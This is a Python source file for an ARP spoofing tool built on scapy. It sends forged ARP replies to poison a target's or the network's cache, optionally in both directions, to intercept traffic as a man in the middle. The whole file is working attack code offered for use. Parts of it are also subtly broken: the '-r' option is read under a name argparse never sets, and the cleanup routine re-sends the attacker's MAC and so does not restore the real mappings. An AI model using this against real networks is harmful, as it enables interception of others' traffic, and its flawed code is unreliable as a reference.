#!/usr/bin/env python
# -*- coding: utf-8 -*-


import argparse
import logging
import os
import signal
import sys
from time import sleep

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp

__author__ = "omega_coder"
__email__ = "yacine@octodet.com"
__created__ = "October 2015"
__version__ = "v1.0"



def disable_ipv6_error():
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def parse_args():
    parser = argparse.ArgumentParser(prog="arpspoof")
    parser.add_argument("-t", "--target", type=str, help="Our Target")
    parser.add_argument("-i", "--interface", type=str, help="Interface to send arp replay's on!")
    parser.add_argument("host", type=str, help="The host")
    parser.add_argument("-r", action="store_true", help="poison both ways!!")
    parser.add_argument("-d", "--delay", type=int, help="Delay to send arp replies (Default. 5 seconds)", default=5)
    args = parser.parse_args()
    return args


def perror(string):
    print("\033[1;31;40m{}\033[0;37;40m\n".format(string))

def p_success(string):
    print("\033[1;32;40m{}\033[0;37;40m".format(string))

def spoof():
    """main spoofing function
    """
    
    disable_ipv6_error()
    args = parse_args()
    if os.geteuid() != 0:
        perror("[!] SCRIPT SHOULD BE RUN  AS ROOT!")
        sys.exit(1)

    host = args.host
    if_mac = get_if_hwaddr(args.interface)
    interface = args.interface
    def make_reply_packet(target, host):
        """Make an ARP reply packet.
        
        Arguments:
            target {string} -- target ip address
            host {string} -- host ip address
        """
        if target is None:
            pkt = Ether(src=if_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=if_mac, psrc=host, op=2)
        else:
            t_mac = None
            p_success("[+] Obtaining MAC address of target {}".format(target))
            while not t_mac:
                t_mac = getmacbyip(target)
            pkt = Ether(src=if_mac, dst=t_mac) / ARP(hwsrc=if_mac, psrc=host, hwdst=t_mac, pdst=target, op=2)
        return pkt


    def rearp_targets(signal, frame):
        """Function to rearp targets when SIGNINT signal is fired.
        
        Arguments:
            signal {signal} -- Signal
            frame {frame} -- Stack frame or execution frame
        """
        sleep(1)
        p_success("\n[+] Rearping Targets")
        r_mac = getmacbyip(host)
        pkt = Ether(src=r_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=host, hwsrc=if_mac, op=2)
        sendp(pkt, inter=1, count=3, iface=interface)

        if args.reverse:
            t_mac = getmacbyip(args.target)
            r_pkt = Ether(src=t_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=args.target, hwsrc=if_mac, op=2)
            sendp(r_pkt, inter=1, count=2, iface=interface)
        p_success("[+] Exiting!")
        sys.exit(0)
    
    # handle SIGINT signal using rearp_target handler
    signal.signal(signal.SIGINT, rearp_targets)

    # Build ARP reply packet.
    pkt = make_reply_packet(args.target, host)

    # handle poisoning in both ways!!
    if args.reverse:
        r_pkt = make_reply_packet(host, args.target)


    while True:
        sendp(pkt, inter=args.delay, iface=interface)
        if args.reverse:
            sendp(r_pkt, inter=args.delay, iface=interface)

if __name__ == "__main__":
    spoof()
